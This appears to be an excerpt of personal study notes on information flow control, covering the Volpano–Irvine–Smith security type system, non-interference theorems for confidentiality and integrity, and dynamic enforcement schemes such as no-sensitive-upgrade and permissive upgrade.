+> 📄 Volpano, Dennis, Cynthia Irvine, and Geoffrey Smith. "A sound type system for secure flow analysis." _Journal of computer security_ 4.2-3 (1996): 167-187.
+
+Essentially the same approach as Denning and Denning:
+- . . . but represented as a **type system**
+	- Security classes like Low and High are considered as types
+	- The ordering of security classes ⊑is considered as a **subtype relation**
+	- Information Flow Analysis is described as a set of **type-inference rules**
+- They give a natural semantics for the programming language.
+- Type system and semantics allows for proving a precise statement about the security of programs that fulfill the information flow policy: a **Non-Interference Result**.
+
+We simplify the paper a bit:
+- Volpano et al. distinguish variables and memory locations, we treat them here all as variables (dropping the concept of introducing local variables).
+- The corresponding symbol tables γ and λ are merged to just γ.
+- We directly work with the syntax-directed form and do not need to distinguish the syntactic roles of variables, expressions and commands in the type system (i.e., we do not have var τ etc.)
+
+###### Syntax
+
+###### Semantics
+
+###### Non-Interference
+
+> [!TIP] Theorem (Non-Interference instantiated for $L \sqsubseteq H$-security)
+> * Suppose a program $c$ satisfies information flow policy $\gamma$:
+> 	* $\gamma \vdash c : \tau \quad \text{(for any type } \tau, \text{ does not matter)}$
+> * Suppose $\mu_1$ and $\mu_2$ are memories that are equal on all **low** variables:
+> 	* $\mu_1(x) = \mu_2(x) \text{ for every } x \text{ with } \gamma(x) = L$
+> * If we run the program on these memories:
+>   * $\mu_1 \vdash c \Rightarrow \mu_1'$
+>   * $\mu_2 \vdash c \Rightarrow \mu_2'$
+>   (and they both terminate)
+> * ... then the result will be the same on all **low** variables:
+> 	* $\mu_1'(x) = \mu_2'(x) \text{ for every } x \text{ with } \gamma(x) = L$
+> 
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.15.35.png)
+
+> [!TIP] Theorem (Non-Interference instantiated for $T \sqsubseteq U$)
+> * Suppose a program $c$ satisfies information flow policy $\gamma$:
+> 	* $\gamma \vdash c : \tau \quad \text{(for any type } \tau, \text{ does not matter)}$
+> * Suppose $\mu_1$ and $\mu_2$ are memories that are equal on all **trusted** variables:
+> 	* $\mu_1(x) = \mu_2(x) \text{ for every } x \text{ with } \gamma(x) = T$
+> * If we run the program on these memories:
+>   * $\mu_1 \vdash c \Rightarrow \mu_1'$
+>   * $\mu_2 \vdash c \Rightarrow \mu_2'$
+>   (and they both terminate)
+> * ... then the result will be the same on all **trusted** variables:
+> 	* $\mu_1'(x) = \mu_2'(x) \text{ for every } x \text{ with } \gamma(x) = T$
+> 
+> Noninteference for Authentication / Integrity 
+> ![|500](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2023.16.16.png)
+
+> [!Example] Confidentiality and Integrity in One Go?
+> ( Referring to examples in "Formalized security policy framework")
+> 
+> ![|300](../../../../../../../../Assets/Pics/Screenshot%202026-04-20%20at%2022.51.55.png)
+> 
+> Question: How can we become more general?
+> Answer: Security Policy Frameworks for Mandatory Access Control.
+##### Jif (DLM-based)
+> 📄 Myers, Andrew C., and Barbara Liskov. "A decentralized model for information flow control." _ACM SIGOPS Operating Systems Review_ 31.5 (1997): 129-142.
+#### Analysis-Based IFC (Program Analysis Techniques)
+↗ [Program Abstraction & Abstract Interpretation](../🛗%20Program%20Abstraction%20&%20Abstract%20Interpretation/Program%20Abstraction%20&%20Abstract%20Interpretation.md)
+↗ [Data Flow Analysis](../Data%20Flow%20Analysis/Data%20Flow%20Analysis.md)
+↗ [Taint Analysis](../Data%20Flow%20Analysis/Taint%20Analysis/Taint%20Analysis.md)
+
+
+### Dynamic Enforcement
+#### No Sensitive Upgrade
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows
+
+"No sensitive upgrade" halts the program whenever a High variable affects the value of a Low variable. Since it simply looks for expressions where an [information leakage](https://en.wikipedia.org/wiki/Information_leakage "Information leakage") might happen, without looking at the context, it may halt a program that, despite having potential information leakage, never actually leaks information.
+
+In the following example x is High and y is Low.
+```
+var x, y
+y := false
+if x = true then
+    y := true
+return true
+```
+
+In this case the program would be halted since—syntactically speaking—it uses the value of a High variable to change a Low variable, despite the program never leaking information.
+#### Permissive Upgrade
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows
+
+Permissive-upgrade introduces an extra security class P which will identify information leaking variables. When a High variable affects the value of a Low variable, the latter is labeled P. If a P labeled variable affects a Low variable the program would be halted. To prevent the halting the Low and P variables should be converted to High using a privatization function to ensure no information leakage can occur. On subsequent instances the program will run without interruption.
+#### Privatization Inference
+> 🔗 https://en.wikipedia.org/wiki/Information_flow_(information_theory)#Declassification_approaches_for_implicit_flows
+
+Privatization inference extends permissive upgrade to automatically apply the privatization function to any variable that might leak information. This method should be used during testing where it will convert most variables. Once the program moves into production the permissive-upgrade should be used to halt the program in case of an information leakage and the privatization functions can be updated to prevent subsequent leaks.
+
+
+### Hybrid Enforcement
+
+
+
+## Ref
